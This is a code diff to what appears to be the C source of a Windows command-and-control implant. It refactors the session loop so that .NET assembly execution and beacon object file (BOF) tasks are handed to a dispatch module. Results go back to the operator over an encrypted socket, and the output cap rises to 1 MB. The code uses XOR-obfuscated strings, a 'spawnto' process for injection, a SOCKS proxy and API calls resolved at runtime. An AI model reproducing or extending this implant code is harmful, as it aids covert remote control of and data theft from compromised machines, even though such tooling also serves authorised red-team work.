@@ -1,7 +1,6 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <stdint.h>
-#include <string.h>
 #include "session.h"
 #include "protocol.h"
 #include "crypto.h"
@@ -12,9 +11,9 @@
 #include "builtin.h"
 #include "shell.h"
 #include "transfer.h"
-#include "assembly.h"
 #include "socks.h"
-#include <stdio.h>
+#include "task_dispatch.h"
+#include "mini_std.h"
 
 /* ---- helpers (no PEB walk needed) ---- */
 
@@ -78,6 +77,20 @@ static DWORD WINAPI socks_loop_thread(LPVOID param) {
     return 0;
 }
 
+typedef struct {
+    SOCKET sock;
+    uint8_t *session_key;
+} session_task_result_ctx_t;
+
+static int session_task_result_cb(void *ctx, uint32_t label, uint8_t type,
+                                  uint8_t code, uint16_t flags,
+                                  const char *output, uint32_t output_len) {
+    session_task_result_ctx_t *rctx = (session_task_result_ctx_t *)ctx;
+    if (!rctx || !rctx->session_key) return -1;
+    return send_result_session_len(rctx->sock, label, type, code, flags,
+                                   output, output_len, rctx->session_key);
+}
+
 /* ---- public API ---- */
 
 int session_init(void) {
@@ -135,7 +148,17 @@ int send_result_session(SOCKET sock, uint32_t label, uint8_t type, uint8_t code,
                         uint16_t flags, const char *output,
                         uint8_t *session_key) {
     DWORD out_len = (DWORD)strlen(output);
-    if (out_len > 65536) out_len = 65536;
+    return send_result_session_len(sock, label, type, code, flags,
+                                   output, out_len, session_key);
+}
+
+int send_result_session_len(SOCKET sock, uint32_t label, uint8_t type,
+                            uint8_t code, uint16_t flags,
+                            const char *output, uint32_t output_len,
+                            uint8_t *session_key) {
+    DWORD out_len = output_len;
+    if (!output) out_len = 0;
+    if (out_len > (1U << 20)) out_len = (1U << 20);
     DWORD body_len = 4 + out_len;
     DWORD pkt_len = 16 + body_len;
 
@@ -154,7 +177,7 @@ int send_result_session(SOCKET sock, uint32_t label, uint8_t type, uint8_t code,
     pkt[17] = (uint8_t)(out_len >> 8);
     pkt[18] = (uint8_t)(out_len >> 16);
     pkt[19] = (uint8_t)(out_len >> 24);
-    memcpy(pkt + 20, output, out_len);
+    if (out_len > 0 && output) memcpy(pkt + 20, output, out_len);
 
     uint8_t *enc = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len + 64);
     if (!enc) { fnLocalFree(pkt); return -1; }
@@ -350,39 +373,17 @@ void session_loop(SOCKET sock, uint8_t *session_key, uint32_t beacon_id,
                 fnClosesocket(g_socks_sock);
             }
         }
-        else if (hdr.type == TASK_EXEC_ASSEMBLY && task_data && task_data_len >= 8) {
-            uint32_t sc_len = (uint32_t)task_data[0]
-                | ((uint32_t)task_data[1] << 8)
-                | ((uint32_t)task_data[2] << 16)
-                | ((uint32_t)task_data[3] << 24);
-            const uint8_t *sc = task_data + 4;
-            if (4 + sc_len + 4 <= task_data_len) {
-                uint32_t sp_off = 4 + sc_len;
-                uint32_t sp_len = (uint32_t)task_data[sp_off]
-                    | ((uint32_t)task_data[sp_off+1] << 8)
-                    | ((uint32_t)task_data[sp_off+2] << 16)
-                    | ((uint32_t)task_data[sp_off+3] << 24);
-                char spawnto_a[MAX_PATH] = {0};
-                if (sp_len > 0 && sp_len < MAX_PATH && sp_off + 4 + sp_len <= task_data_len) {
-                    memcpy(spawnto_a, task_data + sp_off + 4, sp_len);
-                } else {
-                    char _def[ENC_EXEC_ASM_SPAWNTO_LEN + 1];
-                    xor_dec(_def, ENC_EXEC_ASM_SPAWNTO, ENC_EXEC_ASM_SPAWNTO_LEN);
-                    _snprintf(spawnto_a, sizeof(spawnto_a) - 1, "%s", _def);
-                }
-                wchar_t spawnto_w[MAX_PATH] = {0};
-                fnMultiByteToWideChar(65001 /*CP_UTF8*/, 0, spawnto_a, -1, spawnto_w, MAX_PATH);
-
-                char output[EXEC_ASM_MAX_OUTPUT] = {0};
-                exec_assembly(sc, sc_len, spawnto_w, output, sizeof(output));
-                send_result_session(sock, hdr.label, TASK_EXEC_ASSEMBLY, CODE_EXEC_ASSEMBLY,
-                                    FLAG_NONE, output, session_key);
-            } else {
-                char _me[ENC_EXEC_ASM_ERR_INJECT_LEN + 1];
-                xor_dec(_me, ENC_EXEC_ASM_ERR_INJECT, ENC_EXEC_ASM_ERR_INJECT_LEN);
-                send_result_session(sock, hdr.label, TASK_EXEC_ASSEMBLY, CODE_EXEC_ASSEMBLY,
-                                    FLAG_ERROR, _me, session_key);
-            }
+        else if (hdr.type == TASK_EXEC_ASSEMBLY) {
+            session_task_result_ctx_t rctx = { sock, session_key };
+            beacon_task_exec_assembly(task_data, task_data_len,
+                                      hdr.label,
+                                      session_task_result_cb, &rctx);
+        }
+        else if (hdr.type == TASK_BOF) {
+            session_task_result_ctx_t rctx = { sock, session_key };
+            beacon_task_bof(task_data, task_data_len,
+                            hdr.label,
+                            session_task_result_cb, &rctx);
         }
         else if (hdr.type == TASK_EXIT) {
             fnLocalFree(plain);
